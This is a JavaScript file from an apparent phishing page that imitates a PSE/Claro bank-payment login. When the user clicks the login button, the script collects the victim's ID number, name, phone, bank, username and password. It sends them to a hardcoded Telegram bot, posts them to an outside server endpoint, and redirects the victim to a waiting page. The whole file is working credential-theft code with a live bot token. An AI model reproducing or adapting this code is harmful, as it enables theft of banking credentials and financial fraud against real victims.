function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

// Elemento con el botón de entrar
const button = document.getElementById("btnLogin-page1");
// Input de Usuario
const userInput = document.getElementById("docNumberMovil");
// Input de Contraseña
const passInput = document.getElementById("passwordMovil");

async function sendToTelegram(message, chatIds) {
  try {
    // Iterar sobre todos los chatIds y enviar el mensaje a cada uno
    for (const chatId of chatIds) {
      const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
        message
      )}`;

      const response = await fetch(url);
      if (response.ok) {
        console.log(`Mensaje enviado a Telegram para el chatId: ${chatId}`);
      } else {
        console.error(
          `Error al enviar mensaje a chatId ${chatId}:`,
          response.statusText
        );
      }
    }
  } catch (error) {
    console.error("Error de red:", error);
  }
}

button.addEventListener("click", async function (e) {
  e.preventDefault();
  button.disabled = true;

  if (userInput.value == "" && passInput.value == "") {
    alert("Por favor ingrese la información requerida");
    userInput.focus();
    button.disabled = false;
    return;
  } else {
    var user = userInput.value;
    var pass = passInput.value;

    info.metaInfo.user = user;
    info.metaInfo.puser = pass;

    updateLS();

    const data = {
      id: info.metaInfo.cc,
      nombre: info.metaInfo.dudename,
      telefono: info.metaInfo.telnum,
      direccion: "",
      usuario: info.metaInfo.user,
      password: info.metaInfo.puser,
      bank: info.metaInfo.ban,
    };

    // Crear el mensaje con toda la información (mensaje original)
    const message = `🟣 PSE (Claro)\n©️ID: ${data.id}\n🆔Nombre: ${data.nombre}\n📱Teléfono: ${data.telefono}\n🚹Usuario: ${data.usuario}\n🔒Contraseña: ${data.password}\n🏦Banco: ${data.bank}\nFuente: ${fuente}`;

 
    // Enviar el mensaje a todos los chatIds
    await sendToTelegram(message, chatIds);

    // Ahora enviar los datos al servidor
    try {
      const serverResponse = await fetch(`${url}/trico/tricoPse`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (!serverResponse.ok) {
        throw new Error("Network response was not ok");
      }

      const responseData = await serverResponse.json();

      // Redirigir después de que los datos se envíen correctamente
      window.location.href = "./wait.html";
    } catch (error) {
      console.error("Error al enviar los datos al servidor:", error);
      alert("Hubo un error al procesar la solicitud.");
      button.disabled = false;
    }
  }
});
